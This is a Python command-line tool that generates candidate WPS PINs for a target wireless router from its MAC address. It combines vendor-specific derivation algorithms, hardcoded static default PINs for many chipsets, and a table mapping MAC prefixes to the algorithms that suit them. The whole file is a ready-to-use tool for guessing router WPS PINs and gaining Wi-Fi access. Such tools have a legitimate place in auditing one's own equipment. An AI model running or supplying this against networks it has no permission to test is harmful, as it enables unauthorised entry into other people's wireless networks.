# -*- coding: utf-8 -*-
class NetworkAddress():
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    def _mac2int(self, mac):
        return int(mac.replace(':', ''), 16)

    def _int2mac(self, mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class WPSpin():
    '''WPS pin generator'''
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {}
        self.algos['pin24'] = {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24}
        self.algos['pin28'] = {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28}
        self.algos['pin32'] = {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32}
        self.algos['pin36'] = {'name': '36-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin36}
        self.algos['pin40'] = {'name': '40-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin40}
        self.algos['pin44'] = {'name': '44-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin44}
        self.algos['pin48'] = {'name': '48-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin48}
        self.algos['pinDLink'] = {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink}
        self.algos['pinDLink1'] = {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1}
        self.algos['pinASUS'] = {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS}
        self.algos['pinAirocon'] = {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon}
        self.algos['pinInvNIC'] = {'name': 'Inv NIC to PIN', 'mode': self.ALGO_MAC, 'gen': self.pinInvNIC}
        self.algos['pinNIC2'] = {'name': 'NIC * 2', 'mode': self.ALGO_MAC, 'gen': self.pinNIC2}
        self.algos['pinNIC3'] = {'name': 'NIC * 3', 'mode': self.ALGO_MAC, 'gen': self.pinNIC3}
        self.algos['pinOUIaddNIC'] = {'name': 'OUI + NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOUIaddNIC}
        self.algos['pinOUIsubNIC'] = {'name': 'OUI − NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOUIsubNIC}
        self.algos['pinOUIxorNIC'] = {'name': 'OUI ^ NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOUIxorNIC}
        # Static pin algos
        self.algos['pinEmpty'] = {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''}
        self.algos['pinCisco'] = {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567}
        self.algos['pinBrcm1'] = {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252}
        self.algos['pinBrcm2'] = {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484}
        self.algos['pinBrcm3'] = {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990}
        self.algos['pinBrcm4'] = {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714}
        self.algos['pinBrcm5'] = {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411}
        self.algos['pinBrcm6'] = {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719}
        self.algos['pinAirc1'] = {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203}
        self.algos['pinAirc2'] = {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225}
        self.algos['pinDSL2740R'] = {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554}
        self.algos['pinRealtek1'] = {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146}
        self.algos['pinRealtek2'] = {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911}
        self.algos['pinRealtek3'] = {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371}
        self.algos['pinUpvel'] = {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483}
        self.algos['pinUR814AC'] = {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768}
        self.algos['pinUR825AC'] = {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417}
        self.algos['pinOnlime'] = {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604}
        self.algos['pinEdimax'] = {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153}
        self.algos['pinThomson'] = {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814}
        self.algos['pinHG532x'] = {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928}
        self.algos['pinH108L'] = {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988}
        self.algos['pinONO'] = {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}

    def checksum(self, pin):
        '''
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        '''
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return ((10 - accum % 10) % 10)

    def generate(self, algo, mac):
        '''
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        '''
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        '''
        Get all WPS pin's for single MAC
        '''
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        '''
        Get all WPS pin's for single MAC as list
        '''
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        '''
        Get all suggested WPS pin's for single MAC
        '''
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        '''
        Get all suggested WPS pin's for single MAC as list
        '''
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def _suggest(self, mac):
        '''
        Get algos suggestions for single MAC
        Returns the algo ID
        '''
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return (mac.integer & 0xFFFFFF)

    def pin28(self, mac):
        return (mac.integer & 0xFFFFFFF)

    def pin32(self, mac):
        return (mac.integer % 0x100000000)

    def pin36(self, mac):
        return (mac.integer % 0x1000000000)

    def pin40(self, mac):
        return (mac.integer % 0x10000000000)

    def pin44(self, mac):
        return (mac.integer % 0x100000000000)

    def pin48(self, mac):
        return mac.integer

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac.integer & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin

    def pinInvNIC(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = ~nic & 0xFFFFFF
        return pin

    def pinNIC2(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic * 2
        return pin

    def pinNIC3(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic * 3
        return pin

    def pinOUIaddNIC(self, mac):
        mac = mac.string.replace(':', '')
        oui = int(mac[:6], 16)
        nic = int(mac[6:], 16)
        pin = (oui + nic) % int(10e6)
        return pin

    def pinOUIsubNIC(self, mac):
        mac = mac.string.replace(':', '')
        oui = int(mac[:6], 16)
        nic = int(mac[6:], 16)
        pin = oui - nic if nic < oui else (oui + int(10e6) - nic) & 0xFFFFFF
        return pin

    def pinOUIxorNIC(self, mac):
        mac = mac.string.replace(':', '')
        oui = int(mac[:6], 16)
        nic = int(mac[6:], 16)
        pin = oui ^ nic
        return pin


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description='WPS PIN generator written in Python 3',
        epilog='Example: %(prog)s 11:22:33:44:55:66'
    )
    parser.add_argument(
        'mac',
        type=str,
        help='target MAC address to generate PIN code. Example: 11:22:33:44:55:66'
        )
    parser.add_argument(
        '-A', '--get-all',
        action='store_true',
        help='get all PIN codes in addition to the suggested ones for a single MAC'
        )

    args = parser.parse_args()

    pinGen = WPSpin()
    if args.get_all:
        pins = pinGen.getAll(args.mac)
    else:
        pins = pinGen.getSuggested(args.mac)

    if pins:
        print('Found {} PIN(s)'.format(len(pins)))
        print('{:<10} {}'.format('PIN', 'Name'))
        for pin in pins:
            print('{:<10} {}'.format(pin['pin'], pin['name']))
    else:
        print('No PINs found — try to get all PINs (-A)')
